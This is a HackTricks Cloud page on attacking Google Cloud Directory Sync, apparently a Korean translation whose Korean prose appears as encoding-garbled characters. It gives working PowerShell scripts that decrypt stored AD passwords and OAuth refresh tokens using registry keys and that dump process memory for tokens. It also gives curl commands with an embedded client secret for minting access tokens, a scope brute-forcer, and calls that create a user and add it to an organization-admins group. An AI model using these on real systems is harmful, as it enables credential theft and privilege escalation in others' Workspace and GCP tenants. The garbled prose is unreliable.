# GCDS - Google Cloud Directory Sync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

ì´ ë„êµ¬ëŠ” **í™œì„± ë””ë ‰í† ë¦¬ ì‚¬ìš©ì ë° ê·¸ë£¹ì„ Workspaceì— ë™ê¸°í™”í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë„êµ¬**ì…ë‹ˆë‹¤ (ì´ ê¸€ì„ ì‘ì„±í•  ë‹¹ì‹œì—ëŠ” ê·¸ ë°˜ëŒ€ëŠ” ì•„ë‹™ë‹ˆë‹¤).

ì´ ë„êµ¬ëŠ” **Workspace ìŠˆí¼ìœ ì € ë° ê¶Œí•œì´ ìˆëŠ” AD ì‚¬ìš©ì**ì˜ **ìê²© ì¦ëª…**ì´ í•„ìš”í•˜ê¸° ë•Œë¬¸ì— í¥ë¯¸ë¡­ìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì‚¬ìš©ì ë™ê¸°í™”ë¥¼ ìœ„í•´ ê°€ë” ë„ë©”ì¸ ì„œë²„ ë‚´ì—ì„œ ì°¾ì„ ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤.

{% hint style="info" %}
**`config-manager.exe`** ë°”ì´ë„ˆë¦¬ì— ëŒ€í•´ **MitM**ì„ ìˆ˜í–‰í•˜ë ¤ë©´ `config.manager.vmoptions` íŒŒì¼ì— ë‹¤ìŒ ì¤„ì„ ì¶”ê°€í•˜ì„¸ìš”: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)ê°€ **GCDS**ë¥¼ ê°ì§€í•˜ê³ , êµ¬ì„±ì— ëŒ€í•œ ì •ë³´ë¥¼ ì–»ìœ¼ë©° **ì‹¬ì§€ì–´ ë¹„ë°€ë²ˆí˜¸ì™€ ì•”í˜¸í™”ëœ ìê²© ì¦ëª…**ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”.
{% endhint %}

ë˜í•œ GCDSëŠ” ADì—ì„œ Workspaceë¡œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë™ê¸°í™”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë§Œì•½ ë¬´ì–¸ê°€ê°€ ìˆë‹¤ë©´, ìƒˆë¡œ ìƒì„±ëœ ì‚¬ìš©ìì— ëŒ€í•´ Workspaceì—ì„œ ë¬´ì‘ìœ„ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìƒì„±í•  ë¿ì…ë‹ˆë‹¤. ë‹¤ìŒ ì´ë¯¸ì§€ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - Disk Tokens & AD Credentials

ë°”ì´ë„ˆë¦¬ `config-manager.exe` (GUIê°€ ìˆëŠ” ì£¼ìš” GCDS ë°”ì´ë„ˆë¦¬)ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **`C:\Program Files\Google Cloud Directory Sync`** í´ë”ì˜ **`Untitled-1.xml`** íŒŒì¼ì— êµ¬ì„±ëœ Active Directory ìê²© ì¦ëª…, ìƒˆë¡œ ê³ ì¹¨ í† í° ë° ì•¡ì„¸ìŠ¤ë¥¼ ì €ì¥í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì‚¬ìš©ì `Documents` ë˜ëŠ” **ë‹¤ë¥¸ í´ë”**ì— ì €ì¥ë  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ ë ˆì§€ìŠ¤íŠ¸ë¦¬ **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`**ì˜ **`open.recent`** í‚¤ì—ëŠ” ìµœê·¼ì— ì—´ë¦° ëª¨ë“  êµ¬ì„± íŒŒì¼(xml)ì˜ ê²½ë¡œê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ **ì´ë¥¼ í™•ì¸í•˜ì—¬ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

íŒŒì¼ ë‚´ì—ì„œ ê°€ì¥ í¥ë¯¸ë¡œìš´ ì •ë³´ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
ì‚¬ìš©ìì˜ **refresh** **token**ê³¼ **password**ê°€ **AES CBC**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬´ì‘ìœ„ë¡œ ìƒì„±ëœ í‚¤ì™€ IVë¡œ **ì•”í˜¸í™”**ëœë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤. ì´ í‚¤ì™€ IVëŠ” **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`**ì— ì €ì¥ë©ë‹ˆë‹¤(ì—¬ê¸°ì„œ **`prefs`** Java ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” ê¸°ë³¸ ì„¤ì •ì„ ì €ì¥í•©ë‹ˆë‹¤). ë¬¸ìì—´ í‚¤ **`/Encryption/Policy/V2.iv`**ì™€ **`/Encryption/Policy/V2.key`**ì— base64ë¡œ ì €ì¥ë©ë‹ˆë‹¤.

<details>

<summary>refresh tokenê³¼ passwordë¥¼ ë³µí˜¸í™”í•˜ëŠ” Powershell ìŠ¤í¬ë¦½íŠ¸</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
ì´ ì •ë³´ë¥¼ í™•ì¸í•˜ëŠ” ê²ƒì€ **`C:\Program Files\Google Cloud Directory Sync`**ì˜ **`DirSync.jar`** ìë°” ì½”ë“œë¥¼ í™•ì¸í•˜ê³  `exportkeys` ë¬¸ìì—´ì„ ê²€ìƒ‰í•˜ëŠ” ê²ƒìœ¼ë¡œ ê°€ëŠ¥í•˜ë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš” (ì´ëŠ” ë°”ì´ë„ˆë¦¬ `upgrade-config.exe`ê°€ í‚¤ë¥¼ ë¤í”„í•˜ê¸° ìœ„í•´ ê¸°ëŒ€í•˜ëŠ” CLI ë§¤ê°œë³€ìˆ˜ì…ë‹ˆë‹¤).
{% endhint %}

íŒŒì›Œì…¸ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ëŠ” ëŒ€ì‹ , ë§¤ê°œë³€ìˆ˜ `-exportKeys`ì™€ í•¨ê»˜ ë°”ì´ë„ˆë¦¬ **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì—ì„œ **Key**ì™€ **IV**ë¥¼ í—¥ì‚¬ë¡œ ê°€ì ¸ì˜¨ ë‹¤ìŒ, AES/CBCì™€ í•´ë‹¹ í‚¤ ë° IVë¥¼ ì‚¬ìš©í•˜ì—¬ ì •ë³´ë¥¼ ë³µí˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### GCDS - ë©”ëª¨ë¦¬ì—ì„œ í† í° ë¤í”„í•˜ê¸°

GCPWì™€ ë§ˆì°¬ê°€ì§€ë¡œ, `config-manager.exe` í”„ë¡œì„¸ìŠ¤ì˜ ë©”ëª¨ë¦¬ë¥¼ ë¤í”„í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•˜ë©° (ì´ê²ƒì€ GCDSì˜ GUIê°€ ìˆëŠ” ì£¼ìš” ë°”ì´ë„ˆë¦¬ì˜ ì´ë¦„ì…ë‹ˆë‹¤) ë¦¬í”„ë ˆì‹œ ë° ì•¡ì„¸ìŠ¤ í† í°ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì´ë¯¸ ìƒì„±ëœ ê²½ìš°).\
ADì— êµ¬ì„±ëœ ìê²© ì¦ëª…ë„ ì°¾ì„ ìˆ˜ ìˆì„ ê²ƒ ê°™ìŠµë‹ˆë‹¤.

<details>

<summary>config-manager.exe í”„ë¡œì„¸ìŠ¤ ë¤í”„ ë° í† í° ê²€ìƒ‰</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - ë¦¬í”„ë ˆì‹œ í† í°ì—ì„œ ì•¡ì„¸ìŠ¤ í† í° ìƒì„±

ë¦¬í”„ë ˆì‹œ í† í°ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ìŒ ëª…ë ¹ì— ì§€ì •ëœ í´ë¼ì´ì–¸íŠ¸ IDì™€ í´ë¼ì´ì–¸íŠ¸ ë¹„ë°€ì„ ì‚¬ìš©í•˜ì—¬ ì•¡ì„¸ìŠ¤ í† í°ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Scopes

{% hint style="info" %}
ë¦¬í”„ë ˆì‹œ í† í°ì´ ìˆë”ë¼ë„, ì•¡ì„¸ìŠ¤ í† í°ì„ ìƒì„±í•˜ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì§€ì›í•˜ëŠ” **ìŠ¤ì½”í”„ë§Œ ìš”ì²­í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì—** ì•¡ì„¸ìŠ¤ í† í°ì— ëŒ€í•œ ìŠ¤ì½”í”„ë¥¼ ìš”ì²­í•˜ëŠ” ê²ƒì€ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤.

ë˜í•œ, ë¦¬í”„ë ˆì‹œ í† í°ì€ ëª¨ë“  ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ìœ íš¨í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
{% endhint %}

ê¸°ë³¸ì ìœ¼ë¡œ GCSDëŠ” ì‚¬ìš©ìê°€ ëª¨ë“  ê°€ëŠ¥í•œ OAuth ìŠ¤ì½”í”„ì— ì ‘ê·¼í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ, ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ `refresh_token`ìœ¼ë¡œ `access_token`ì„ ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ìŠ¤ì½”í”„ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

ê·¸ë¦¬ê³  ì´ê²ƒì€ ì œê°€ ì‘ì„± ë‹¹ì‹œ ë°›ì€ ì¶œë ¥ì…ë‹ˆë‹¤:
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### ì‚¬ìš©ì ìƒì„± ë° `gcp-organization-admins` ê·¸ë£¹ì— ì¶”ê°€í•˜ì—¬ GCPì—ì„œ ê¶Œí•œ ìƒìŠ¹ ì‹œë„
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
ìƒˆ ì‚¬ìš©ìì—ê²Œ Super Amin ì—­í• ì„ ë¶€ì—¬í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. **ë¦¬í”„ë ˆì‹œ í† í°ì— í•„ìš”í•œ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆëŠ” ì¶©ë¶„í•œ ë²”ìœ„ê°€ ì—†ìŠµë‹ˆë‹¤.**
{% endhint %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
